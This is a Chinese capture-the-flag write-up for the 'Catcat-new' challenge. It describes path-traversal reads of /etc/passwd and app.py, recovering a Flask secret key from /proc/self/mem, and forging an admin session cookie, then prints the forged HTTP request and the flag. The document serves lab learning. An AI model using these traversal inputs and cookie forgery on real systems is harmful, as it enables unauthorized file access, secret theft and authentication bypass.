# Catcat-new

> python3 flask session + 任意文件读取

## 思路分析

> 打开网站后,有四张图片,第1步翻看网站源码,无果,扫目录发现存在admin路径,直接访问提示nonono,点击下面的文字,会跳转,info?file=ForestCat.txt,貌似任意文件读取,info?file=../../../../../../etc/passwd,读取成功,说明存在文件读取漏洞,想直接读取flag,试了好久,都失败了,尝试读取proc/self信息,得到信息较少,然后百度类似题目,尝试/info?file=../app.py,读取成功,格式化代码后发现存在cat文件,读取得到cat.py,分析代码得要想得到flag,得在cookie里设置特定的session才行,即admin=1.设置session的SECRET_KEY是随机生成的32位字符,爆破是不可能的,爆破就是36的32次方,继续百度,发现可以读取/proc/self/maps和/proc/self/maps和/proc/self/mem去找到key.然后用https://github.com/noraj/flask-session-cookie-manager去解码请求admin路径时返回的cookie,修改admin的值,编码,请求admin路径时加入cookie,得到flag

## payload

```
GET /admin HTTP/1.1
Host: 61.147.171.105:63286
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: session=eyJhZG1pbiI6MX0.Y8famQ.klBbPAlwFFtSSJkE3ckR1nqkGFI;
Connection: close
``` 

## flag

> catctf{Catch_the_c4t_HaHa}